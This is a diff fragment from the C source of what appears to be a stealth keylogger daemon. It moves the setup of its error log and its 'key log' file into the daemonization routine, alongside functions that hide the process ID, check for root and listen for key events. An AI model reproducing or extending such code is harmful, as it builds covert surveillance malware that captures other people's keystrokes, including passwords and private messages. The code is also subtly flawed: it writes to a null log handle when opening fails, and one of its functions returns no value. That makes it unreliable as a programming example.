@@ -33,6 +33,8 @@ void daemonize(void) {
 	}
 
 	umask(0);										/* unmask the file mode */
+	setup_dirs();
+	setup_logs();
 	sid = setsid();										/* set unique session for child process */
 	if (sid < 0) {
 		exit(1);
@@ -48,6 +50,23 @@ void daemonize(void) {
 
 int setup_dirs(void) {
     return mkdir("/opt/col_log/", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);		/* log directory */
+}
+
+int setup_logs(void) {
+	time_t curtime;
+	time(&curtime);	
+	
+	error_log = fopen("/opt/col_log/log.txt", "a+"); 					/* daemon log */
+	if (NULL == error_log) {
+                fprintf(error_log, "ERROR: error_log couldn't be opened -- %s", ctime(&curtime));
+                exit(1);
+        }	
+
+        evlog = fopen(evlog_path, "a+");		 					/* key log */
+	if (NULL == evlog) {
+                fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
+                exit(1);
+        }	
 }
 
 int hide_pid(void) {
@@ -171,22 +190,6 @@ void key_listen(void) {
 }
 
 int main(void) {
-	time_t curtime;
-	time(&curtime);	
-	
-	setup_dirs();
-
-	error_log = fopen("/opt/col_log/log.txt", "a+"); 					/* daemon log */
-	if (NULL == error_log) {
-                fprintf(error_log, "ERROR: error_log couldn't be opened -- %s", ctime(&curtime));
-                exit(1);
-        }	
-
-        evlog = fopen(evlog_path, "a+");		 					/* key log */
-	if (NULL == evlog) {
-                fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
-                exit(1);
-        }	
 	daemonize();
 	hide_pid();
 	is_root();
